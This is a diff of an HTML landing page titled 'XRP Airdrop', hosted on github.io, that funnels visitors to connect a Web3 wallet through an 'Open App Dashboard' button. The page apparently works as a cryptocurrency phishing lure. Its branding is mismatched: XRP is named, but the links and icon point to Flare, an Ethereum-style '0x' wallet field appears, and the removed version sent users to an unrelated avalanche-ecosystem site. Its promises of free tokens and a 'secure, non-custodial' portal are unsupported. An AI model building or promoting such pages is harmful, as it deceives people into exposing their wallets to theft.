@@ -3,127 +3,387 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>XRP Airdrop</title>
-  <meta name="description" content="XRP Airdrop checks distribution eligibility for XRP from your own wallet before you continue in the app.">
+  <title>XRP Airdrop - Decentralized DeFi Portal</title>
+  <meta name="description" content="Secure, non-custodial portal for XRP Airdrop DeFi operations directly from your own wallet.">
   <link rel="canonical" href="https://xrp-airdrop-page.github.io/">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#08090D">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="XRP Airdrop">
-  <meta property="og:description" content="XRP Airdrop checks distribution eligibility for XRP from your own wallet before you continue in the app.">
-  <meta property="og:url" content="https://xrp-airdrop-page.github.io/">
-  <meta property="og:image" content="https://xrp-airdrop-page.github.io/favicon.png">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="XRP Airdrop">
-  <meta name="twitter:description" content="XRP Airdrop checks distribution eligibility for XRP from your own wallet before you continue in the app.">
+  <meta name="robots" content="index,follow">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
-  <link rel="stylesheet" href="style.css">
+  <link rel="prefetch" href="dashboard/">
+  <link rel="prerender" href="dashboard/">
+  <style>
+
+
+:root{
+  --bg:#08090D;
+  --panel:#101116;
+  --panel-2:#15161D;
+  --ink:#F8F4F6;
+  --muted:#A7A0A5;
+  --soft:#756D73;
+  --line:rgba(255,255,255,.08);
+  --line-strong:rgba(255,255,255,.08);
+  --accent:#E62058;
+  --accent-soft:rgba(230,32,88,.16);
+  --shadow:0 30px 70px -42px rgba(230,32,88,.72);
+  --max:1080px;
+}
+
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;
+  min-height:100dvh;
+  overflow:hidden;
+  background:
+    radial-gradient(60% 48% at 50% -18%, rgba(230,32,88,.18), transparent 66%),
+    var(--bg);
+  color:var(--ink);
+  font-family:Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  line-height:1.5;
+  -webkit-font-smoothing:antialiased;
+  display:flex;
+  flex-direction:column;
+}
+
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+h1,p{margin:0}
+h1{
+  font-size:clamp(2.55rem, 6vw, 4.45rem);
+  line-height:1.04;
+  letter-spacing:0;
+  font-weight:800;
+}
+
+.topbar{
+  flex:0 0 auto;
+  width:100%;
+  display:flex;
+  align-items:center;
+  gap:16px;
+  padding:18px clamp(16px, 4vw, 40px);
+}
+
+.brand{
+  display:inline-flex;
+  align-items:center;
+  gap:10px;
+  min-width:0;
+  font-size:1.08rem;
+  font-weight:800;
+}
+
+.brand img{
+  width:28px;
+  height:28px;
+  border-radius:8px;
+  box-shadow:0 0 0 1px var(--line);
+}
+
+.nav{
+  display:flex;
+  align-items:center;
+  gap:24px;
+  margin-left:18px;
+}
+
+.nav a{
+  color:var(--muted);
+  font-size:.93rem;
+  font-weight:500;
+  transition:color .15s ease;
+}
+
+.nav a:hover{color:var(--ink)}
+.spacer{flex:1}
+
+.ghost{
+  display:inline-flex;
+  align-items:center;
+  justify-content:center;
+  min-height:38px;
+  padding:9px 17px;
+  border:1px solid var(--line-strong);
+  border-radius:999px;
+  color:var(--ink);
+  background:rgba(255,255,255,.035);
+  font-size:.9rem;
+  font-weight:700;
+  white-space:nowrap;
+  transition:transform .12s ease, border-color .2s ease, background .2s ease;
+}
+
+.ghost:hover{
+  transform:translateY(-1px);
+  border-color:rgba(230,32,88,.48);
+  background:var(--accent-soft);
+}
+
+.stage{
+  flex:1 1 auto;
+  min-height:0;
+  width:100%;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:28px;
+  padding:12px clamp(16px, 4vw, 40px);
+  text-align:center;
+}
+
+.hero{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+}
+
+.sub{
+  max-width:56ch;
+  margin-top:14px;
+  color:var(--muted);
+  font-size:clamp(1rem, 1.5vw, 1.16rem);
+}
+
+.sub strong{
+  color:var(--ink);
+  font-weight:800;
+  box-shadow:inset 0 -.46em 0 var(--accent-soft);
+}
+
+.card{
+  width:min(500px, 100%);
+  padding:18px;
+  border:1px solid var(--line);
+  border-radius:20px;
+  background:linear-gradient(180deg, rgba(255,255,255,.045), rgba(255,255,255,.02)), var(--panel);
+  box-shadow:var(--shadow);
+  transition:border-color .18s ease, transform .18s ease;
+}
+
+.card.is-ready{
+  border-color:rgba(230,32,88,.34);
+  transform:translateY(-1px);
+}
+
+.status{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  min-height:34px;
+  margin-bottom:12px;
+  border:1px solid var(--line);
+  border-radius:12px;
+  color:var(--ink);
+  background:rgba(230,32,88,.08);
+  font-size:.82rem;
+  font-weight:700;
+}
+
+.status-dot{
+  width:8px;
+  height:8px;
+  border-radius:50%;
+  background:var(--accent);
+  box-shadow:0 0 18px rgba(230,32,88,.88);
+}
+
+.rows{
+  display:grid;
+  gap:10px;
+}
+
+.row,
+.wallet{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:16px;
+  min-height:58px;
+  padding:12px 14px;
+  border:1px solid var(--line);
+  border-radius:14px;
+  background:var(--panel-2);
+  text-align:left;
+}
+
+.label{
+  color:var(--soft);
+  font-size:.72rem;
+  font-weight:800;
+  letter-spacing:.07em;
+  text-transform:uppercase;
+  white-space:nowrap;
+}
+
+.value{
+  color:var(--ink);
+  font-weight:800;
+}
+
+.token{
+  display:inline-flex;
+  align-items:center;
+  gap:9px;
+  color:var(--ink);
+  font-weight:800;
+}
+
+.token img{
+  width:24px;
+  height:24px;
+  border-radius:50%;
+  box-shadow:0 0 0 1px var(--line);
+}
+
+.wallet input{
+  width:100%;
+  max-width:250px;
+  border:0;
+  outline:0;
+  padding:0;
+  background:transparent;
+  color:var(--ink);
+  font:inherit;
+  font-weight:700;
+  text-align:right;
+}
+
+.act{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  width:100%;
+  min-height:52px;
+  margin-top:14px;
+  border-radius:14px;
+  background:var(--accent);
+  color:#fff;
+  font-size:1.04rem;
+  font-weight:800;
+  box-shadow:0 18px 34px -24px rgba(230,32,88,.95);
+  transition:transform .12s ease, background .18s ease;
+}
+
+.act:hover{
+  transform:translateY(-1px);
+  background:var(--accent);
+}
+
+.note{
+  margin-top:11px;
+  color:var(--soft);
+  font-size:.78rem;
+}
+
+.foot{
+  flex:0 0 auto;
+  padding:16px 24px 22px;
+  color:var(--soft);
+  text-align:center;
+  font-size:.84rem;
+}
+
+.foot b{
+  color:var(--muted);
+  font-weight:700;
+}
+
+@media(max-width:700px){
+  .topbar{
+    padding:14px 16px;
+    gap:10px;
+  }
+
+  .nav{display:none}
+
+  .brand span{
+    max-width:84px;
+    overflow:hidden;
+    text-overflow:ellipsis;
+    white-space:nowrap;
+  }
+
+  .ghost{
+    min-height:36px;
+    padding:8px 14px;
+    font-size:.86rem;
+  }
+
+  .stage{
+    gap:18px;
+    padding:6px 16px;
+  }
+
+  .sub{
+    max-width:34ch;
+    margin-top:10px;
+    font-size:.96rem;
+  }
+
+  .card{
+    padding:14px;
+    border-radius:18px;
+  }
+
+  .row,
+  .wallet{
+    min-height:52px;
+    padding:10px 12px;
+  }
+
+  .wallet input{
+    max-width:190px;
+    font-size:.94rem;
+  }
+
+  .act{
+    min-height:48px;
+    margin-top:12px;
+  }
+
+  .foot{
+    padding:12px 16px 14px;
+  }
+}
+
+@media(max-width:380px){
+  h1{font-size:2.38rem}
+  .sub{font-size:.92rem}
+  .note{font-size:.74rem}
+}
+
+
+  
+.footer {
+  text-align: center !important;
+}
+  </style>
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="#" aria-label="XRP Airdrop">
-      <img src="favicon.png" width="28" height="28" alt="">
-      <span>XRP</span>
-    </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://flarescan.com/" target="_blank" rel="nofollow noopener noreferrer">Flarescan</a>
-      <a href="https://www.coingecko.com/en/coins/flare" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
-      <a href="https://dev.flare.network/support/flr" target="_blank" rel="nofollow noopener noreferrer">Flare Docs</a>
-    </nav>
+    <div class="brand">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>XRP Airdrop</span>
+    </div>
     <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+    <nav class="nav" aria-label="Main Navigation">
+      <a href="how-it-works/">How it works</a>
+      <a href="faq/">FAQ</a>
+      <a href="about/">About</a>
+      <a href="security/">Security</a>
+      <a href="supported-chains/">Supported Chains</a>
+    </nav>
   </header>
-
-  <main class="stage">
-    <section class="hero" aria-label="XRP Airdrop entry">
-      <h1>XRP Airdrop</h1>
-      <p class="sub"><strong>XRP Airdrop</strong> checks distribution eligibility for XRP from your own wallet before you continue in the app.</p>
-    </section>
-
-    <section class="card" aria-label="Airdrop eligibility preview">
-      <div class="status">
-        <span class="status-dot" aria-hidden="true"></span>
-        <span>Eligibility checked in app</span>
-      </div>
-
-      <div class="rows">
-        <div class="row">
-          <span class="label">Network</span>
-          <span class="value">XRP Ledger</span>
-        </div>
-        <div class="row">
-          <span class="label">Token</span>
-          <span class="token">
-            <img src="flr.png" width="24" height="24" alt="XRP">
-            <span>XRP</span>
-          </span>
-        </div>
-        <label class="wallet">
-          <span class="label">Wallet</span>
-          <input type="text" value="0x... checked in app" readonly aria-label="Wallet checked in app">
-        </label>
-      </div>
-
-      <a class="act" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
-      <p class="note">Preview only &mdash; wallet status and distribution details are shown in the app.</p>
-    </section>
+  <main class="stage" style="padding: 100px 24px; text-align: center; max-width: 800px; margin: 0 auto;">
+    <h1 style="font-size: clamp(2.5rem, 6vw, 4.5rem); margin-bottom: 24px; font-weight: 800;">XRP Airdrop</h1>
+    <p class="value" style="font-size: 1.25rem; opacity: 0.8; margin-bottom: 40px; line-height: 1.6;">Secure, non-custodial gateway for decentralized operations. Connect your Web3 wallet to enter the portal.</p>
+    <a class="open-app" href="dashboard/" style="display: inline-flex; justify-content: center; align-items: center; min-height: 52px; padding: 0 32px; border-radius: 9999px; background: var(--accent, #625bf3); color: #fff; font-weight: 700; text-decoration: none; font-size: 1.1rem; box-shadow: 0 10px 30px rgba(0,0,0,0.15); transition: transform 0.2s ease;">Open App Dashboard</a>
   </main>
-
-  <footer class="foot">
-    <b>XRP Airdrop</b> &mdash; 2026
-  </footer>
-
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebSite",
-        "@id": "https://avalanche-ecosystem.github.io/#website",
-        "url": "https://avalanche-ecosystem.github.io/",
-        "name": "XRP Airdrop",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://avalanche-ecosystem.github.io/#org",
-        "name": "XRP",
-        "url": "https://flare.network/",
-        "sameAs": [
-          "https://flare.network/",
-          "https://twitter.com/FlareNetworks",
-          "https://github.com/flare-foundation",
-          "https://dev.flare.network/"
-        ]
-      },
-      {
-        "@type": "WebApplication",
-        "@id": "https://avalanche-ecosystem.github.io/#app",
-        "name": "XRP Airdrop",
-        "applicationCategory": "FinanceApplication",
-        "operatingSystem": "Web",
-        "url": "https://avalanche-ecosystem.github.io/",
-        "offers": {
-          "@type": "Offer",
-          "price": "0",
-          "priceCurrency": "USD"
-        }
-      }
-    ]
-  }
-  </script>
-
-  <script>
-  (function(){
-    "use strict";
-    var card = document.querySelector(".card");
-    var button = document.querySelector(".act");
-    if(!card || !button) return;
-    button.addEventListener("mouseenter", function(){ card.classList.add("is-ready"); });
-    button.addEventListener("mouseleave", function(){ card.classList.remove("is-ready"); });
-  })();
-  </script>
+  <footer class="footer">XRP Airdrop &mdash; 2026</footer>
 </body>
 </html>
